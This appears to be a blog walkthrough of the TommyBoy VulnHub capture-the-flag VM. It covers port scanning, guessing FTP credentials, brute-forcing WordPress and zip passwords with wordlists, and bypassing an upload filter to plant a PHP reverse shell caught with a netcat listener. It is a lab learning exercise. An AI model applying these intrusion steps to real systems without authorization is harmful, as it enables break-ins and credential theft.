<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the TommyBoy VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-tommyboy-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-09-12T08:14:16+00:00">September 12, 2016</time><time class="updated" datetime="2025-06-10T20:30:35+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Tommy Boy VM is a CTF based on the movie Tommy Boy and the fictitious company “Callahan Auto” in the movie. This CTF, Tommy Boy, has been created by Brian Johnson of 7 Minute Security. It is a really fun VM — a few bits of it were fairly easy, some parts of it were really tricky, and there are some pretty neat little tricks in there too.</span></p>
<p><span style="color: #000000;"><strong>Note from the author:</strong></span></p>
<p><span style="color: #000000;">The primary objective is to restore a backup copy of the homepage to Callahan Auto’s server. However, to consider the box fully pwned, you’ll need to collect 5 flags strewn about the system and use the data inside them to unlock one final message.</span></p>
<p><span style="color: #000000;"><strong><u>WalkThrough</u></strong></span></p>
<p><span style="color: #000000;">Let’s start off with scanning the network to find our target.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-qse4cNNfKRk/W2FqdngYjuI/AAAAAAAAY-I/cWoV89HNWHo0XcBspEOgQu1VJmT0je5bgCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">We found our target –&gt; 192.168.1.108</span></p>
<p><span style="color: #000000;">Our next step is to scan our target with NMAP. We will apply an aggressive scan as it is quick.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.108</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-TFSxrb7rZr0/W2Fqft-YosI/AAAAAAAAY-s/r6FJIgNekqM-X7TEpS6LPA21kgQ2xf4JQCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">The result shows us that there are 3 ports opened: 22(ssh), 80(http), 8008(http).</span></p>
<p><span style="color: #000000;">To further explore and find rest of the flags we browsed URL on port 80 and we greeted with the Callahan Auto page which apparently was experiencing some technical difficulties.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-MNNY2HqMp24/W2FqhURV_yI/AAAAAAAAY_M/UwPtG5kntXo9fEwa913uaIAOMbxcgn1gQCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Let’s use Nikto tool to have detailed information about our target. So for this, type the following  :</span></p>
<pre class="lang:default decode:true">nikto -h http://192.168.1.108/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-um4XaCoM0ZM/W2FqjqzqXpI/AAAAAAAAY_4/yRDAywWqwRIRj7tRCELPNTt1yOCVB5dogCLcBGAs/s1600/3_1.png"/></span></p>
<p><span style="color: #000000;">By using the Nikto command we found out that there is a text file with the name of robots.txt which might contain some useful information. Either we can open it in our browser or can list the contents via the curl command as shown below. And yes, we found our first flag.</span></p>
<pre class="lang:default decode:true">curl http://192.168.1.108/robots.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-fiMR5YtWcqM/W2Fqj2lTJkI/AAAAAAAAY_8/U2d1ZO7iWHQkwEMnL4PSc5un8JfgMx1GQCLcBGAs/s1600/3_2.png"/></span></p>
<p><span style="color: #000000;">Hurrah!!  We got our first flag     <strong>B34rcl4ws</strong></span></p>
<p><span style="color: #000000;">I took a look at the main page again, to see if there’s anything of interest in the View Source. I found a Youtube link.</span></p>
<p><span style="color: #000000;">I then executed the CURL command which would also give the same results (as view-source) and happen to found a Youtube link. There seems to be no harm in opening it, so let us do that and see if it has some significant information.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-jroow9yXmeA/W2FqkOjqnrI/AAAAAAAAZAE/bRxJSICKgAQ2yqXckS77lz1X0uMJcZ4uwCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Upon opening the Youtube link, we can predict that it has something to do with prehistoric forest. So we decided to use it on the browser as –&gt; 192.168.1.108/prehistoricforext/</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-khw7YKMMyPg/W2Fqle1sF8I/AAAAAAAAZAU/8f27mdGb1wY14UL-_4yeNQ_iBk7YrAwBwCLcBGAs/s1600/5.png"/></span></p>
<pre class="lang:default decode:true">http://192.168.1.108/prehistoricforest</pre>
<p><span style="color: #000000;">And to our luck, we found a lot of information. First of our information was that the website was made in WordPress</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-T42evJ4ymm4/W2FqlhShWeI/AAAAAAAAZAc/tpJioWauW5YRJask3iEliQ29RrXlYmC-wCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JbW6Y5qbp8w/W2FqlorJmlI/AAAAAAAAZAY/_1twURzfIbgIB1FwFF_XxeNRJVtXPE07wCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">As we found another important clue on the same web page of the prehistoric forest we decided to investigate further. And this decision proved right as we found another clue which stated to use <strong>/richard</strong> instead of <strong>/prehistoricforest</strong></span></p>
<p><span style="color: #000000;">Let’s browse with http://192.168.1.108/richard/</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-cuUGQiI2_nI/W2Fql5n-k5I/AAAAAAAAZAg/4wE9XD1to-Ye_2FJ2UHz_iiN0y7x5sJzwCLcBGAs/s1600/8.png"/></span></p>
<pre class="lang:default decode:true">http://192.168.1.108/richard/shockedrichard.jpg</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lQb6fNaCwvs/W2Fqmav9T8I/AAAAAAAAZAk/vNTKqCIYZMEvirM6kM6YLVPODcrz1l_HwCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">This image, being as it is, gave us no clue. So we decided to open it with EXIF tool.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-iZdSxRgpW_g/W2FqdY2k6LI/AAAAAAAAY-E/T7e8UUXnPO4A3zD4_Ja8mcSR7kfXgxTZgCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Go to <a style="color: #000000;" href="https://www.md5cracker.com/">www.md5cracker.com</a>  OR <a style="color: #000000;" href="https://hashkiller.io/listmanager">http://www.hashkiller.co.uk/</a> site and crack the md5 code we just discovered. On cracking it we will find that it makes up the word <strong>spanky</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9AFujJH_9z8/W2FqdlH5K2I/AAAAAAAAY-M/plkLov4aB6wetn5QWD6wZb2fjwTjgufWACLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">The output of cracked MD5 hash :</span></p>
<pre class="lang:default decode:true">ce154b5a8e59c89732bc25d6a2e6b90b   spanky</pre>
<p><span style="color: #000000;">Further investigating the same “prehistoricforest” page we found other important things like the text file which contained our second flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-k19e_hCDBWY/W2FqeGim1CI/AAAAAAAAY-Q/OkZ3Ex-3Tg0b0emA4a5E5FbFvdLwbQP2QCLcBGAs/s1600/12.png"/></span></p>
<pre class="lang:default decode:true">http://192.168.1.108/prehistoricforest/thisisthesecondflagyayyou.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-foPdjcyRLak/W2FqeYqTo_I/AAAAAAAAY-U/6GxCKIHWkWkqGsFZGBfiCmFIkk3d0_f7wCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Hurrah!!  We got our <strong>2<sup>nd</sup> Flag</strong> –   <strong>Z4l1nsky</strong></span></p>
<p><span style="color: #000000;">If we furthermore navigate to the URL http://192.168.1.108/prehistoricforest  and go to a password protected blog, then it will prompt for a password. Let’s try and input the password as <strong>spanky. </strong>Hey, we are in !!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-S7-QXR_Qf5I/W2FqeTbdLKI/AAAAAAAAY-Y/y03zN9uxkZ8bEtQyt2yK5v5WmbjQJcUtACLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">We are able to read the blog now, which contains loads of information with the hidden hints. Go through the full-page and note down the things to remember :</span></p>
<p><span style="color: #000000;">Upon going through the page, we noted down 2 things (refer below screenshot), which could be a way going forward. We will utilize these clues one by one.</span></p>
<p><span style="color: #000000;"><strong>1. There is something about nickburns</strong></span></p>
<ol start="2">
<li><span style="color: #000000;"><strong> There is an FTP service running and hosted on a Non-standard port. Also, the FTP server goes up and down with a regular frequency of 15 mins </strong></span></li>
</ol>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-jurGSEHHW0I/W2FqeiwUfmI/AAAAAAAAY-c/CwPpeFbQukoMo9F0SHBZhbdZczTS5ztJwCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Now let’s try to find if the FTP port is open as per the clue provided in the blog. We scanned for the ports before and did not find an FTP port anywhere. So let us scan port by port.</span></p>
<p><span style="color: #000000;"><strong>Note:</strong> The FTP server was running on a non-standard port and goes on/off every 15 minutes.</span></p>
<pre class="lang:default decode:true">nmap -p- -sV 192.168.1.108 --open</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-2uG7DyYwi6g/W2Fqe3UYKaI/AAAAAAAAY-g/ivxZr11S5SAGu-HACkPvhWWPU0tg_6s2gCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">We took a guess that he may re-use his username as his password and tried as <strong>nickburns: nickburns</strong> and it was successful!</span></p>
<pre class="lang:default decode:true">ftp 192.168.1.108 65534</pre>
<p><span style="color: #000000;">Upon taking a look at the readme file, we were presented with some additional clues.</span></p>
<pre class="lang:default decode:true">cat readme.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ZETYiqWkzqY/W2FqfM-AqqI/AAAAAAAAY-k/72OftRE80e04HxEXIcZ7HsFEEKAOpMQ7gCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">In the file, you will see that he is talking about a subfolder “NickizL33t“. I tried this subdirectory on port 80 but got no success, therefore I tried again on port 8008.</span></p>
<p><span style="color: #000000;">First, let’s try to access http://192.168.1.108:8008/ and see what is in store for us.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Sevo8KGJUMA/W2FqfahhNvI/AAAAAAAAY-o/DJrzIm8mpd045P55EwfGeOjkEyi19Y-yACLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Now if we pay attention and notice it says “only me and Steve Jobs are allowed to look at this stuff” that means we can read the content with iPhone. There is Add-on for Mozilla browser named “User Agent Switcher” which will allow us to read the said file.</span></p>
<p><span style="color: #000000;">When you have added this Add-on. Go to the Tools menu. A drop-down menu will appear select Default User Agent and from its select iPhone 3.0 option.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-QcHrnotWHa8/W2FqfhdVNnI/AAAAAAAAY-w/Z54UswgAimQa5oJd9DL4OBJ8abQ5GcuTQCLcBGAs/s1600/19.png"/></span></p>
<p> </p>
<pre class="lang:default decode:true">http://192.168.1.108:8008/NickIzL33t/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-gl-fy9C2F8o/W2Fqf4wPjMI/AAAAAAAAY-0/jP2KJYOO-388HKTLsLrKYPtNL237jzGCQCLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Now as he is talking about certain .html file. As we have already checked everywhere and didn’t find such a file. It’s a possibility that this file was hidden so let’s use DIRBuster or dirb to find it.</span></p>
<p><span style="color: #000000;"><strong>Note:</strong> Running the below command will take a lot of memory and hence it is recommended to upgrade/increase the RAM of your system sufficient enough to run this command.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.108:8008/NickIzL33t/ /usr/share/wordlists/rockyou.txt -a "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25" -X .html</pre>
<p><span style="color: #000000;">Finally. After a long wait, we got the html file – <strong>fallon1.html</strong></span></p>
<p><span style="color: #000000;">Upon browsing the URL  http://192.168.1.108:8008/NickIzL33t/fallon1.html and as we can see we got a lot of information</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-C-g66yyy5eQ/W2FqgKfw4pI/AAAAAAAAY-4/03XTt7Rr8_YUFxMSKroXmFdkNsd2yaghACLcBGAs/s1600/21.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JEn_BYUFn0o/W2FqgZfOMaI/AAAAAAAAY-8/vpaYdkDAfBAQlt_09MraMDBfeglkuWV6ACLcBGAs/s1600/22.png"/></span></p>
<p><span style="color: #000000;">Hurrah!!  We got our <strong>3<sup>rd</sup> Flag</strong> –     <strong>TinyHead</strong></span></p>
<p><span style="color: #000000;">Additionally, download the zip file <strong>t0msp4ssw0rdz.zip</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-0a9yWUojcgg/W2Fqgu9Ql9I/AAAAAAAAY_A/6-60_-lEw0Yng-5Zvjvg6COpEVUyRsBygCLcBGAs/s1600/23.png"/></span></p>
<p> </p>
<p><span style="color: #000000;">Also, let’s click on <strong><u>A hint</u></strong> and we will get redirected to http://192.168.1.108:8008/NickIzL33t/hint.txt  where we will find hints about the passwords.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-3s9oTarYCoU/W2FqhFcRAEI/AAAAAAAAY_E/oeBey3R3ou4a7BnQB4jmaCIN8aZqw04CQCLcBGAs/s1600/24.png"/></span></p>
<p><span style="color: #000000;">We need to figure out how to create a custom dictionary utilizing the above clues which Nick has given us.It starts with ‘bev’,1 upper case char, 2 numbers, 2 lowercase chars, one symbol and then 1995</span></p>
<p><span style="color: #000000;"><strong>bev[A-Z][1–9][1–9][a-z][a-z][symbol]1995</strong></span></p>
<p><span style="color: #000000;">Let’s use crunch utility to create a dictionary with the following command:</span></p>
<pre class="lang:default decode:true">crunch 13 13 -t bev,%%@@^1995 -o /root/Desktop/dict.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-DzcxN_Kt7m0/W2FqhBFaI1I/AAAAAAAAY_I/eG4VTfby6Bkxoeh6EOi_PLgtXbjVHm_XACLcBGAs/s1600/29.png"/></span></p>
<p><span style="color: #000000;">Now we have got our custom dictionary from the clues. Let’s use it to brute force Big Tom’s password file with the help of a fcrackzip tool.</span></p>
<pre class="lang:default decode:true">cd Downloads/
fcrackzip -u -D -p /root/Desktop/dict.txt t0msp4ssw0rdz.zip
Password = bevH00tr$1995</pre>
<p><span style="color: #000000;">Unzip the file using the password extracted in the above step :</span></p>
<pre class="lang:default decode:true">unzip t0msp4ssw0rdz.zip</pre>
<p><span style="color: #000000;">Here we will get a file passwords.txt, upon reading the same we will get the output with some usernames and credentials.</span></p>
<pre class="lang:default decode:true">cat passwords.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-NHYlnQ-uy84/W2FqhgCumUI/AAAAAAAAY_Q/iVKLMNLV7BsCwV_kXiR2U5MjT248bFw1QCLcBGAs/s1600/30.png"/></span></p>
<p><span style="color: #000000;">Here we need to identify the full password of Callahan Auto Server as it is clearly mentioned that after the “fatguyinalittlecoat“ part there are some numbers; however, the admin doesn’t remember that.</span></p>
<p><span style="color: #000000;"><strong>Username:</strong> bigtommysenior</span></p>
<p><span style="color: #000000;"><strong>Password:</strong> fatguyinalittlecoat <strong><em> &lt;partial password&gt;</em></strong></span></p>
<p><span style="color: #000000;">Let’s perform a WordPress Scan and enumerate the users</span></p>
<pre class="lang:default decode:true">wpscan -u http://192.168.1.108/prehistoricforest/ --enumerate u</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-W284X0m5f8w/W2Fqh-ggxaI/AAAAAAAAY_U/qfcDqIcj9tUGofzVbrT8GRW1QFiaJRn9ACLcBGAs/s1600/31.png"/></span></p>
<pre class="lang:default decode:true">wpscan -u http://192.168.1.108/prehistoricforest/ --wordlist=/usr/share/wordlists/rockyou.txt --username tom</pre>
<p><span style="color: #000000;">Password for user ‘tom’ is ‘tomtom1’</span></p>
<p><span style="color: #000000;">I tried finding the credentials for user tommy and it went for quite long, finally, I abandoned it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-GmpoYaBKBdc/W2FqhwRIqtI/AAAAAAAAY_Y/C2xJgA5F5_sAtT9hA9pX5ndgipzcja7ewCLcBGAs/s1600/32.png"/></span></p>
<p><span style="color: #000000;">Now let’s log in to the WordPress site http://192.168.1.108/prehistoricforest/wp-admin as user ‘tom’ with the above credentials. Once logged in, we will find a post in the “drafts” folder of the dashboard – <strong>my-ess-ess-eight-password</strong></span></p>
<p><span style="color: #000000;">We also got a clue (from <strong>my-ess-ess-eight-password</strong> – read it as SSH password ) that there is something on SSH port that we may need to look upon going forward !!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ZKSh2crwYCo/W2FqiD6zYKI/AAAAAAAAY_c/Vug6ljFUmY4hcxZIB5QAAnEaBcuFeyVmgCLcBGAs/s1600/33.png"/></span></p>
<p> </p>
<p><span style="color: #000000;">So now, we will try to log in with SSH port with the user bigtommysenior with the following credentials:</span></p>
<pre class="lang:default decode:true">Username: bigtommysenior
Password: fatguyinalittlecoat1938!!
ssh bigtommysenior@192.168.1.108</pre>
<p><span style="color: #000000;">To see the list of files and folders type :</span></p>
<pre class="lang:default decode:true">ls -la</pre>
<p><span style="color: #000000;">Here we will see a file el-flag-numero-quatro.txt which could be of our interest. Let’s open the same</span></p>
<pre class="lang:default decode:true">cat el-flag-numero-quatro.txt</pre>
<p><span style="color: #000000;">The contents of the file contain the flag data!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-irB3FHkwzlQ/W2FqiY1U6AI/AAAAAAAAY_g/GCHsxFFUxgE8TC-6iJ3JTw83D83X2dIrQCLcBGAs/s1600/34.png"/></span></p>
<p><span style="color: #000000;">Hurrah!!  We got our <strong>4th Flag</strong> –   <strong>EditButton</strong></span></p>
<p><span style="color: #000000;">In addition, we got a clue for <strong>the 5th flag</strong> as well (i.e a name of the file <strong>/5.txt</strong>)</span></p>
<p><span style="color: #000000;"><strong>1.Restoration of the website</strong></span></p>
<p><span style="color: #000000;">Before we go to the last flag, we need to restore the backup first. As seen from the above screenshot there is a <strong>callahanbak.bak </strong>file, which seems to be a backup file. Let’s copy this file to the /var/www/html directory as follows :</span></p>
<pre class="lang:default decode:true">cp callahanbak.bak /var/www/html/index.html</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-41DxxMTKxcg/W2FqipyZKjI/AAAAAAAAY_k/7AtzXxq_o8oRpvElVcR0-c8POvowQrLuQCLcBGAs/s1600/35.png"/></span></p>
<p><span style="color: #000000;">Now try browsing the company website. http://192.168.1.108/index.html. As a result of restoring the backup, we can see that now the website has been restored back to normal.</span></p>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://3.bp.blogspot.com/-Y0k_C7SRad0/W2Fqi-cjeGI/AAAAAAAAY_o/dKSunmX82XcKxX-G1bfW5wFj9zwqBbVXgCLcBGAs/s1600/36.png"/></strong></span></p>
<ol start="2">
<li><span style="color: #000000;"><strong> Capture the last flag</strong></span></li>
</ol>
<p><span style="color: #000000;">Upon exploring more and doing view-source for http://192.168.1.108:8008/NickIzL33t/fallon1.html, we found a clue for a particular folder <strong>P4TCH_4D4MS</strong>. Let’s append this as a sub-directory to URL http://192.168.1.108:8008/NickIzL33t/</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-4uVw9bYoR6o/W2Fqi9tZsNI/AAAAAAAAY_s/wGM9uj_x7poZnjS7r_5A-TxP03tA-NfbACLcBGAs/s1600/37.png"/></span></p>
<p> </p>
<p><span style="color: #000000;">Browse the URL http://192.168.1.108:8008/NickIzL33t/P4TCH_4D4MS/  It gives an option to upload an image file. This is a clue that we can upload our reverse shell here</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oYvk0wxxPEo/W2Fqja5ez8I/AAAAAAAAY_w/GiAtremvs5g3xjogJERItjUqoLQ8FHXUQCLcBGAs/s1600/38.png"/></span></p>
<p><span style="color: #000000;">We already have an existing <strong>php-reverse-shell.php</strong> file under the path <strong>usr/share/webshells/php </strong>of Kali Linux<strong>. </strong>Let’s edit the php-reverse-shell.php file and modify with Kali IP as follows ($ip = ‘192.168.1.107’)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-cE5qddUPsZI/W2Fqjrk_e1I/AAAAAAAAY_0/sI--kihFgu4vdGkIoYBh3c4nyxlqWbEDQCLcBGAs/s1600/39.png"/></span></p>
<p><span style="color: #000000;">While trying to upload the php file (with PHP extension), we were unable to upload this file and greeted with an error saying only image (JPEG, PNG, GIF) files are allowed.</span></p>
<p><span style="color: #000000;">This means that there is a file extension restriction/filter in place. Let’s try to rename the file extension to .png and see if it works. Yes, upon uploading again we observed that the file <strong>php-reverse-shell.png</strong> has been uploaded successfully.</span></p>
<pre class="lang:default decode:true">http://192.168.1.108:8008/NickIzL33t/P4TCH_4D4MS/upload.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Q-dqAiApHuk/W2FqkOHT1gI/AAAAAAAAZAA/FrI1acz7cTYZpxoZmgu6-9RwjZ5UZSwIQCLcBGAs/s1600/40.png"/></span></p>
<p><span style="color: #000000;">We now need to go the <strong>uploads</strong> folders and change the extension back to its original self (i.e change from .png back to .php). Before that, we need to find out where exactly is the uploads folder?</span></p>
<p><span style="color: #000000;">Upon navigation and more research we found that the following path contains the uploads folder, which has the <strong>php-reverse-shell.png </strong>file uploaded by us earlier.</span></p>
<pre class="lang:default decode:true">cd /var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/
ls</pre>
<p><span style="color: #000000;">Here we can see the <strong>uploads</strong> directory which might contain some interesting files</span></p>
<pre class="lang:default decode:true">cd uploads/
ls</pre>
<p><span style="color: #000000;">From the output, we can see the file <strong>php-reverse-shell.png </strong>(uploaded in the earlier step)<strong>, </strong>listed under the uploads directory</span></p>
<p><span style="color: #000000;">Now move/replace the file<strong> php-reverse-shell.png </strong>with the<strong> php-reverse-shell.php </strong>as shown below</span></p>
<pre class="lang:default decode:true">mv php-reverse-shell.png php-reverse-shell.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-QtYddT-emzg/W2FqkoilifI/AAAAAAAAZAI/o_XiQhRZ41gpsirVdK2hJ59vQZzo6cthACLcBGAs/s1600/41.png"/></span></p>
<p><span style="color: #000000;">Let’s run the Netcat listener</span></p>
<pre class="lang:default decode:true">nc –lvp 1234</pre>
<p><span style="color: #000000;">Browse the following URL and we will get the limited shell access</span></p>
<pre class="lang:default decode:true">http://192.168.1.108:8008/NickIzL33t/P4TCH_4D4MS/uploads/php-reverse-shell.php</pre>
<p><span style="color: #000000;">Now let’s read the content and we will see that .5.txt file is listed here :</span></p>
<pre class="lang:default decode:true">ls -la
cat .5.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-1_Ar_i4Cmys/W2Fqk80SggI/AAAAAAAAZAM/VowjH7YXQSYgAoh9yxxY5unfBVKxNBKrQCLcBGAs/s1600/42.png"/></span></p>
<p><span style="color: #000000;">Voila!!  We got our <strong>5th Flag</strong> –     <strong>Buttcrack</strong></span></p>
<p><span style="color: #000000;">As we have captured all five flags, let’s concatenate all the flags together which is a long string and may eventually help us to open the zip file</span></p>
<pre class="lang:default decode:true ">String : B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack</pre>
<p><span style="color: #000000;">So, now unzip the zip file:</span></p>
<pre class="lang:default decode:true">unzip LOOT.zip</pre>
<p><span style="color: #000000;">It will prompt for unzip password and we will type the lengthy string (as mentioned above ) as the password. Once the file is unzipped it will contain the last part of the challenge i.e. a text file. Let’s read it and finish this whole thing up :</span></p>
<pre class="lang:default decode:true">cat THE-END.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ZdEkGMhwZAI/W2Fqkx3vYbI/AAAAAAAAZAQ/19b9YAkmm8wqRLSwSXHLL-sN1Oti8ZdLACLcBGAs/s1600/43.png"/></span></p>
<p><span style="color: #000000;"><strong>Author:</strong> Ankur Sachdev is an Information Security consultant and researcher in the field of Network &amp; WebApp Penetration Testing. Contact <strong><a href="https://www.linkedin.com/in/sachdevankur/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
